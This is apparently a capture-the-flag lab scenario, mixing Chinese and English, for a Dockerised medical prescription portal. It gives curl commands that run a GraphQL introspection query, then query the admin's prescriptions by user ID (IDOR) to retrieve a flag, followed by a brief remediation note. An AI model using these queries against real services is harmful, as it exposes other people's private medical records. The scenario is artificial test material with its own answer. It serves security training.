# WEB-16: GraphQL Introspection + IDOR

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-16 |
| 名称 | GraphQL Introspection + IDOR |
| 技术/CVE | GraphQL introspection + IDOR |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10116 |

## 场景概述
- 技术：GraphQL introspection + IDOR
- 难度：L2
- 交付方式：docker
- 入口端口：10116
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | GraphQL Introspection + IDOR |
| Difficulty | L2 |
| Port | 10116 |
| Path | scenarios/web/graphql-idor/ |
| Type | docker |
| Service | Medical Prescription Portal |

### Attack Path Summary
```
Access GraphiQL → Introspection query → Discover get_prescriptions(user_id) → IDOR query admin's prescriptions → Flag
```

### Prerequisites

#### Knowledge
- GraphQL schema introspection: Querying GraphQL schemas to discover types, fields, and arguments
- GraphQL查询语法 (GraphQL query syntax): Writing structured GraphQL queries to request specific data
- IDOR原理 (IDOR principles): Understanding Insecure Direct Object Reference vulnerabilities where user IDs are not validated

#### Tools
- curl: Send GraphQL queries via command line
- GraphiQL (browser): Interactive GraphQL IDE available at the /graphql endpoint
- Altair GraphQL Client: Feature-rich GraphQL client for schema exploration

### Step-by-Step Exploitation

#### Step 1: Access the GraphiQL Interface

Open the GraphQL endpoint to confirm the service is running.

```bash
curl http://localhost:10116/graphql
```

#### Step 2: Run Introspection Query

Discover all available types, queries, mutations, and their arguments by executing an introspection query.

```bash
curl -X POST http://localhost:10116/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name args { name type { name } } } } } }"}'
```

#### Step 3: Identify the Vulnerable Query

From the introspection results, find the `getPrescriptions(userId: Int)` query that allows specifying a user ID.

#### Step 4: Exploit IDOR to Access Admin Prescriptions

Query prescriptions for user_id=1 (admin) without proper authorization checks.

```bash
curl -X POST http://localhost:10116/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ getPrescriptions(userId: 1) { id medication instructions } }"}'
```

The flag is contained in the first prescription's instructions field.

### Flag Location
- Stored as admin's prescription in the SQLite database, accessible through IDOR

### Verification Commands
```bash
curl -s -X POST http://localhost:10116/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ getPrescriptions(userId: 1) { id medication instructions } }"}' \
  | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | GraphQL endpoint and object authorization |
| 侦察与前置条件 | Schema introspection and object ID enumeration |
| 核心漏洞与利用 | Combine GraphQL introspection with an IDOR query |
| 权限、横向或影响 | Cross-user data access |
| 验证 | Query the unauthorized object that contains the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
